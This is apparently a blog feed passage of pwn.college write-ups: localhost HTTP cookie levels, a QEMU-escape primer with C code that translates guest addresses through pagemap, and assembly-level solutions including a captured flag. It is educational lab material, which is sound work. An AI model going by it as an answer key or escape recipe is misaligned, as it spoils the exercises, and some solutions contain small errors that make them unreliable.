<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#首先获取cookie</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">HTTP/1.1 302 FOUND</span><br><span class="line">Server: Werkzeug/3.0.4 Python/3.8.10</span><br><span class="line">Date: Fri, 27 Sep 2024 13:14:37 GMT</span><br><span class="line">Content-Length: 189</span><br><span class="line">Location: /</span><br><span class="line">Set-Cookie: cookie=8cfeb913e6ae783eb6fc8ef132a9afef; Path=/</span><br><span class="line">Server: pwn.college</span><br><span class="line">Connection: close</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Cookie:cookie=&lt;value&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">#import json</span><br><span class="line">#JSON=&#123;&quot;a&quot;:&quot;24d15198bf78c8a49316030c83a2cd73&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;512c400b&quot;,&quot;d&quot;:[&quot;aef2ba89&quot;,r&quot;8577e840 e4f7f4be&amp;91312c36#87765893&quot;]&#125;&#125;</span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<p>python还是一把梭？？</p>
<h2 id="level37-39"><a href="#level37-39" class="headerlink" title="level37-39"></a>level37-39</h2><p>发送四个有状态的请求，先把cookie拿过来先</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -c cookie.txt 127.0.0.1</span><br><span class="line">curl -c cookie.txt -b cookie.txt 127.0.0.1</span><br><span class="line">curl -c cookie.txt -b cookie.txt 127.0.0.1</span><br><span class="line">curl -c cookie.txt -b cookie.txt 127.0.0.1</span><br><span class="line">curl -c cookie.txt -b cookie.txt 127.0.0.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Cookie:session=&lt;cookie&gt;*4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">#import json</span><br><span class="line">#JSON=&#123;&quot;a&quot;:&quot;24d15198bf78c8a49316030c83a2cd73&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;512c400b&quot;,&quot;d&quot;:[&quot;aef2ba89&quot;,r&quot;8577e840 e4f7f4be&amp;91312c36#87765893&quot;]&#125;&#125;</span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwn-college</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu_escape</title>
    <url>/2024/12/19/qemu_escape/</url>
    <content><![CDATA[<h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><p>QEMU是一个开源的虚拟机，它使用动态二进制转换技术来模拟处理器，并且提供多种硬件和外设模型，这使它能够运行多种未修改的客户机操作系统，能与<a href="https://zh.wikipedia.org/wiki/%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA">KVM</a>配合以接近本地速度运行虚拟机（接近真实电脑的速度）</p>
<p>有多种运行模式：</p>
<ol>
<li>User mode：用户模式，在这种模式下，QEMU 运行某个单一的程序，并且适配其的系统调用。一般异构pwn都是这种模式。</li>
<li>System mode：系统模式，在这种模式下，QEMU 可以模拟出一个完整的计算机系统。一般qemu逃逸都是这种模式。</li>
</ol>
<p>qemu逃逸中往往是打qemu中的模拟pci设备，通过共享内存交换数据，逃出qemu这个小系统，到宿主机上getshell(或是其他命令)</p>
<h2 id="qemu内存结构"><a href="#qemu内存结构" class="headerlink" title="qemu内存结构"></a>qemu内存结构</h2><p>GPA(guest 物理地址)其实是由mmap得到的，这段地址是没有执行权限的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>

<p>以strng为例分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-m 1G \</span><br><span class="line">-device strng \</span><br><span class="line">-hda my-disk.img \</span><br><span class="line">-hdb my-seed.img \</span><br><span class="line">-nographic \</span><br><span class="line">-L pc-bios/ \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-device e1000,netdev=net0 \</span><br><span class="line">-netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>

<p>分配了1g的内存空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7f5a2fd00000     0x7f5a2fe00000 rw-p   100000      0 [anon_7f5a2fd00]                                                                                                                      </span><br><span class="line">   0x7f5a2fe00000     0x7f5a6fe00000 rw-p 40000000      0 [anon_7f5a2fe00]                                                                                                                      </span><br><span class="line">   0x7f5a6fe00000     0x7f5a6fe01000 ---p     1000      0 [anon_7f5a6fe00] </span><br></pre></td></tr></table></figure>

<h2 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h2><p>qemu模拟的是一个小系统，实现了内存虚拟化，为Guest提供了一个在它看来从0开始的连续物理内存空间</p>
<p>在qemu中存在两种地址转换</p>
<p>一是GVA到GPA，从Guest虚拟地址到Guest物理地址，这一层是模拟真实设备中的虚拟地址和物理地址，通过分析转换规则，可以模拟这一层转换</p>
<p>二是GPA到 HVA，从Guest物理地址到Host虚拟地址，这一层是把Guest的物理地址转换为qemu使用mmap申请的地址，我们只需要获取内存基址，再和GPA相加即可得到，因为GPA和HVA是一一对应的。到了这一步就相当于我们来到了libc那一层，qemu肯定也是要有libc依赖库的，就可以从libc中调用函数来实现对主机攻击。</p>
<p>关于GVA-&gt;GPA这一步，核心在于pagemap这个接口，在&#x2F;proc&#x2F;pid&#x2F;下面有个文件叫pagemap，它会每个page，生成了一个64bit的描述符，来描述虚拟地址这一页对应的物理页帧号或者SWAP里面的偏移，详见文档：</p>
<p><a href="https://www.kernel.org/doc/Documentation/admin-guide/mm/pagemap.rst">pagemap</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Bits 0-54  : physical frame number if present.</span><br><span class="line">- Bit  55    : page table entry is soft-dirty.</span><br><span class="line">- Bit  56    : page exclusively mapped.</span><br><span class="line">- Bits 57-60 : zero</span><br><span class="line">- Bit  61    : page is file-page or shared-anon.</span><br><span class="line">- Bit  62    : page is swapped.</span><br><span class="line">- Bit  63    : page is present.</span><br></pre></td></tr></table></figure>

<p>我们只需要获取当前页帧号，再加上页内偏移即可得到物理地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_SHIFT  12</span><br><span class="line">#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="line">#define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="line">#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><span class="line"> </span><br><span class="line">int fd;</span><br><span class="line">// 获取页内偏移</span><br><span class="line">uint32_t page_offset(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    // addr &amp; 0xfff</span><br><span class="line">    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gfn(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t pme, gfn;</span><br><span class="line">    size_t offset;</span><br><span class="line"> </span><br><span class="line">    printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br><span class="line">    offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;</span><br><span class="line"> 	</span><br><span class="line">    ////下面是网上其他人的代码，只是为了理解上面的代码</span><br><span class="line">    //一开始除以 0x1000  （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，</span><br><span class="line">    //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址</span><br><span class="line">    //最终  vir/2^12 * 8 = (vir / 2^9) &amp; ~7</span><br><span class="line">    //这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你  vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0</span><br><span class="line">    // int page_size=getpagesize();</span><br><span class="line">    // unsigned long vir_page_idx = vir/page_size;</span><br><span class="line">    // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);</span><br><span class="line"> </span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    //得到页表项偏移后移到pagemap对应的页表项</span><br><span class="line">    read(fd, &amp;pme, 8);</span><br><span class="line">    // 确保页面存在——page is present.</span><br><span class="line">    if (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        return -1;</span><br><span class="line">    // physical frame number</span><br><span class="line">    gfn = pme &amp; PFN_PFN;    </span><br><span class="line">    return gfn;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gpa(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != -1);</span><br><span class="line">    return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);</span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t *ptr;</span><br><span class="line">    uint64_t ptr_mem;</span><br><span class="line"> </span><br><span class="line">    fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ptr = malloc(256);</span><br><span class="line">    strcpy(ptr, &quot;Where am I?&quot;);</span><br><span class="line">    printf(&quot;%s\n&quot;, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    printf(&quot;Your physical address is at 0x%&quot;PRIx64&quot;\n&quot;, ptr_mem);</span><br><span class="line">    printf(&quot;Your virtual address is at 0x%&quot;PRIx64&quot;\n&quot;, (uint64_t)ptr);</span><br><span class="line">    printf(&quot;pagesize: %d\n&quot;, getpagesize());</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该程序向guest中写入了Where am i?字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7f5a2fe00000+0x3e046f30</span><br><span class="line">0x7f5a6de46f30: &quot;Where am I?&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gdb中也是成功获取到HVA</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>assembly-crash-course</title>
    <url>/2024/10/21/pwn-college-assembly-crash-course/</url>
    <content><![CDATA[<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Welcome to ASMLevel1</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">To interact with any level you will send raw bytes over stdin to this program.</span><br><span class="line">To efficiently solve these problems, first run it to see the challenge instructions.</span><br><span class="line">Then craft, assemble, and pipe your bytes to this program.</span><br><span class="line"></span><br><span class="line">For instance, if you write your assembly code in the file asm.S, you can assemble that to an object file:</span><br><span class="line">  as -o asm.o asm.S</span><br><span class="line"></span><br><span class="line">Note that if you want to use Intel syntax for x86 (which, of course, you do), you&#x27;ll need to add the following to the start of asm.S:</span><br><span class="line">  .intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">Then, you can copy the .text section (your code) to the file asm.bin:</span><br><span class="line">  objcopy -O binary --only-section=.text asm.o asm.bin</span><br><span class="line"></span><br><span class="line">And finally, send that to the challenge:</span><br><span class="line">  cat ./asm.bin | /challenge/run</span><br><span class="line"></span><br><span class="line">You can even run this as one command:</span><br><span class="line">  as -o asm.o asm.S &amp;&amp; objcopy -O binary --only-section=.text ./asm.o ./asm.bin &amp;&amp; cat ./asm.bin | /challenge/run</span><br><span class="line"></span><br><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br></pre></td></tr></table></figure>



<p>关卡要求修改特定寄存器的值并提示可以使用objcopy工具将text段复制到文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#asm.S</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 0x1337</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">as -o asm.o asm.S</span><br><span class="line">objcopy -O binary --only-section=.text asm.o asm.bin</span><br><span class="line">cat ./asm.bin | /challenge/run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to ASMLevel1</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">To interact with any level you will send raw bytes over stdin to this program.</span><br><span class="line">To efficiently solve these problems, first run it to see the challenge instructions.</span><br><span class="line">Then craft, assemble, and pipe your bytes to this program.</span><br><span class="line"></span><br><span class="line">For instance, if you write your assembly code in the file asm.S, you can assemble that to an object file:</span><br><span class="line">  as -o asm.o asm.S</span><br><span class="line"></span><br><span class="line">Note that if you want to use Intel syntax for x86 (which, of course, you do), you&#x27;ll need to add the following to the start of asm.S:</span><br><span class="line">  .intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">Then, you can copy the .text section (your code) to the file asm.bin:</span><br><span class="line">  objcopy -O binary --only-section=.text asm.o asm.bin</span><br><span class="line"></span><br><span class="line">And finally, send that to the challenge:</span><br><span class="line">  cat ./asm.bin | /challenge/run</span><br><span class="line"></span><br><span class="line">You can even run this as one command:</span><br><span class="line">  as -o asm.o asm.S &amp;&amp; objcopy -O binary --only-section=.text ./asm.o ./asm.bin &amp;&amp; cat ./asm.bin | /challenge/run</span><br><span class="line"></span><br><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In this level you will work with registers! Please set the following:</span><br><span class="line">  rdi = 0x1337</span><br><span class="line"></span><br><span class="line">Please give me your assembly in bytes (up to 0x1000 bytes): </span><br><span class="line">Executing your code...</span><br><span class="line">---------------- CODE ----------------</span><br><span class="line">0x400000:       mov     rdi, 0x1337</span><br><span class="line">--------------------------------------</span><br><span class="line">pwn.college&#123;AJWwZ7nrzaB0HKKeQpKdrgeX250.0FN5EDLwgDMzEzW&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In this level you will work with multiple registers. Please set the following:</span><br><span class="line">  rax = 0x1337</span><br><span class="line">  r12 = 0xCAFED00D1337BEEF</span><br><span class="line">  rsp = 0x31337</span><br></pre></td></tr></table></figure>

<p>直接mov就行了</p>
<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br><span class="line"></span><br><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Many instructions exist in x86 that allow you to do all the normal</span><br><span class="line">math operations on registers and memory.</span><br><span class="line"></span><br><span class="line">For shorthand, when we say A += B, it really means A = A + B.</span><br><span class="line"></span><br><span class="line">Here are some useful instructions:</span><br><span class="line">  add reg1, reg2       &lt;=&gt;     reg1 += reg2</span><br><span class="line">  sub reg1, reg2       &lt;=&gt;     reg1 -= reg2</span><br><span class="line">  imul reg1, reg2      &lt;=&gt;     reg1 *= reg2</span><br><span class="line"></span><br><span class="line">div is more complicated and we will discuss it later.</span><br><span class="line">Note: all &#x27;regX&#x27; can be replaced by a constant or memory location</span><br><span class="line"></span><br><span class="line">Do the following:</span><br><span class="line">  add 0x331337 to rdi</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x266</span><br></pre></td></tr></table></figure>

<p>关卡要求使用add改变rdi值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    add rdi, 0x331337</span><br></pre></td></tr></table></figure>

<p>如上代码即可</p>
<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br><span class="line"></span><br><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using your new knowledge, please compute the following:</span><br><span class="line">  f(x) = mx + b, where:</span><br><span class="line">    m = rdi</span><br><span class="line">    x = rsi</span><br><span class="line">    b = rdx</span><br><span class="line"></span><br><span class="line">Place the result into rax.</span><br><span class="line"></span><br><span class="line">Note: there is an important difference between mul (unsigned</span><br><span class="line">multiply) and imul (signed multiply) in terms of which</span><br><span class="line">registers are used. Look at the documentation on these</span><br><span class="line">instructions to see the difference.</span><br><span class="line"></span><br><span class="line">In this case, you will want to use imul.</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x2470</span><br><span class="line">  rsi = 0x16fb</span><br><span class="line">  rdx = 0x26ed</span><br></pre></td></tr></table></figure>

<p>本关卡要求计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f(x) = mx + b</span><br><span class="line">其中</span><br><span class="line">  m = rdi</span><br><span class="line">  x = rsi</span><br><span class="line">  b = rdi</span><br><span class="line">并将结果存入rax中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax, rdi ;</span><br><span class="line">    imul rax, rsi ;</span><br><span class="line">    add rax, rdx ;</span><br></pre></td></tr></table></figure>

<p>即可</p>
<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br><span class="line"></span><br><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Division in x86 is more special than in normal math. Math in here is</span><br><span class="line">called integer math. This means every value is a whole number.</span><br><span class="line"></span><br><span class="line">As an example: 10 / 3 = 3 in integer math.</span><br><span class="line"></span><br><span class="line">Why?</span><br><span class="line"></span><br><span class="line">Because 3.33 is rounded down to an integer.</span><br><span class="line"></span><br><span class="line">The relevant instructions for this level are:</span><br><span class="line">  mov rax, reg1; div reg2</span><br><span class="line"></span><br><span class="line">Note: div is a special instruction that can divide</span><br><span class="line">a 128-bit dividend by a 64-bit divisor, while</span><br><span class="line">storing both the quotient and the remainder, using only one register as an operand.</span><br><span class="line"></span><br><span class="line">How does this complex div instruction work and operate on a</span><br><span class="line">128-bit dividend (which is twice as large as a register)?</span><br><span class="line"></span><br><span class="line">For the instruction: div reg, the following happens:</span><br><span class="line">  rax = rdx:rax / reg</span><br><span class="line">  rdx = remainder</span><br><span class="line"></span><br><span class="line">rdx:rax means that rdx will be the upper 64-bits of</span><br><span class="line">the 128-bit dividend and rax will be the lower 64-bits of the</span><br><span class="line">128-bit dividend.</span><br><span class="line"></span><br><span class="line">You must be careful about what is in rdx and rax before you call div.</span><br><span class="line"></span><br><span class="line">Please compute the following:</span><br><span class="line">  speed = distance / time, where:</span><br><span class="line">    distance = rdi</span><br><span class="line">    time = rsi</span><br><span class="line">    speed = rax</span><br><span class="line"></span><br><span class="line">Note that distance will be at most a 64-bit value, so rdx should be 0 when dividing.</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x2069</span><br><span class="line">  rsi = 0x44</span><br></pre></td></tr></table></figure>

<p>关卡要求计算速度，速度&#x3D;距离&#x2F;时间</p>
<p>使用div指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax, rdi ;</span><br><span class="line">    mov rdx, 0 ;</span><br><span class="line">    div rsi ;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Modulo in assembly is another interesting concept!</span><br><span class="line"></span><br><span class="line">x86 allows you to get the remainder after a div operation.</span><br><span class="line"></span><br><span class="line">For instance: 10 / 3 -&gt; remainder = 1</span><br><span class="line"></span><br><span class="line">The remainder is the same as modulo, which is also called the &quot;mod&quot; operator.</span><br><span class="line"></span><br><span class="line">In most programming languages we refer to mod with the symbol &#x27;%&#x27;.</span><br><span class="line"></span><br><span class="line">Please compute the following:</span><br><span class="line">  rdi % rsi</span><br><span class="line"></span><br><span class="line">Place the value in rax.</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x2eaa4872</span><br><span class="line">  rsi = 0x3</span><br></pre></td></tr></table></figure>

<p>关卡要求计算模，在x86-64中可使用idiv来计算模</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax, rdi ;</span><br><span class="line">    idiv rsi;</span><br><span class="line">    mov rax,rdx;</span><br></pre></td></tr></table></figure>

<p>最终余数存储在rdx中</p>
<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Another cool concept in x86 is the ability to independently access to lower register bytes.</span><br><span class="line"></span><br><span class="line">Each register in x86_64 is 64 bits in size, and in the previous levels we have accessed</span><br><span class="line">the full register using rax, rdi or rsi.</span><br><span class="line"></span><br><span class="line">We can also access the lower bytes of each register using different register names.</span><br><span class="line"></span><br><span class="line">For example the lower 32 bits of rax can be accessed using eax, the lower 16 bits using ax,</span><br><span class="line">the lower 8 bits using al.</span><br><span class="line"></span><br><span class="line">MSB                                    LSB</span><br><span class="line">+----------------------------------------+</span><br><span class="line">|                   rax                  |</span><br><span class="line">+--------------------+-------------------+</span><br><span class="line">                     |        eax        |</span><br><span class="line">                     +---------+---------+</span><br><span class="line">                               |   ax    |</span><br><span class="line">                               +----+----+</span><br><span class="line">                               | ah | al |</span><br><span class="line">                               +----+----+</span><br><span class="line"></span><br><span class="line">Lower register bytes access is applicable to almost all registers.</span><br><span class="line"></span><br><span class="line">Using only one move instruction, please set the upper 8 bits of the ax register to 0x42.</span><br></pre></td></tr></table></figure>

<p>关卡要求仅使用一个mov使ax的高8位变为0x42，已经给出提示，rax，eax，ax，al，以及ah对应ax的高8位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah,0x42;</span><br></pre></td></tr></table></figure>



<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It turns out that using the div operator to compute the modulo operation is slow!</span><br><span class="line"></span><br><span class="line">We can use a math trick to optimize the modulo operator (%). Compilers use this trick a lot.</span><br><span class="line"></span><br><span class="line">If we have &quot;x % y&quot;, and y is a power of 2, such as 2^n, the result will be the lower n bits of x.</span><br><span class="line"></span><br><span class="line">Therefore, we can use the lower register byte access to efficiently implement modulo!</span><br><span class="line"></span><br><span class="line">Using only the following instruction(s):</span><br><span class="line">  mov</span><br><span class="line"></span><br><span class="line">Please compute the following:</span><br><span class="line">  rax = rdi % 256</span><br><span class="line">  rbx = rsi % 65536</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  rdi = 0x3ae0</span><br><span class="line">  rsi = 0x8bd5220f</span><br></pre></td></tr></table></figure>

<p>关卡给出关于<code> x%y 且 y为2^n</code>的计算方法</p>
<p>即rdi的低8位和rsi的低16位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov al, dil;</span><br><span class="line">    mov bx, si;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>al,dil为寄存器低8位，bx，si为低16位</p>
<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with registers. You will be asked to modify</span><br><span class="line">or read from registers.</span><br><span class="line"></span><br><span class="line">We will now set some values in memory dynamically before each run. On each run</span><br><span class="line">the values will change. This means you will need to do some type of formulaic</span><br><span class="line">operation with registers. We will tell you which registers are set beforehand</span><br><span class="line">and where you should put the result. In most cases, its rax.</span><br><span class="line"></span><br><span class="line">In this level you will be working with bit logic and operations. This will involve heavy use of</span><br><span class="line">directly interacting with bits stored in a register or memory location. You will also likely</span><br><span class="line">need to make use of the logic instructions in x86: and, or, not, xor.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Shifting bits around in assembly is another interesting concept!</span><br><span class="line"></span><br><span class="line">x86 allows you to &#x27;shift&#x27; bits around in a register.</span><br><span class="line"></span><br><span class="line">Take, for instance, al, the lowest 8 bits of rax.</span><br><span class="line"></span><br><span class="line">The value in al (in bits) is:</span><br><span class="line">  rax = 10001010</span><br><span class="line"></span><br><span class="line">If we shift once to the left using the shl instruction:</span><br><span class="line">  shl al, 1</span><br><span class="line"></span><br><span class="line">The new value is:</span><br><span class="line">  al = 00010100</span><br><span class="line"></span><br><span class="line">Everything shifted to the left and the highest bit fell off</span><br><span class="line">while a new 0 was added to the right side.</span><br><span class="line"></span><br><span class="line">You can use this to do special things to the bits you care about.</span><br><span class="line"></span><br><span class="line">Shifting has the nice side affect of doing quick multiplication (by 2)</span><br><span class="line">or division (by 2), and can also be used to compute modulo.</span><br><span class="line"></span><br><span class="line">Here are the important instructions:</span><br><span class="line">  shl reg1, reg2       &lt;=&gt;     Shift reg1 left by the amount in reg2</span><br><span class="line">  shr reg1, reg2       &lt;=&gt;     Shift reg1 right by the amount in reg2</span><br><span class="line">  Note: 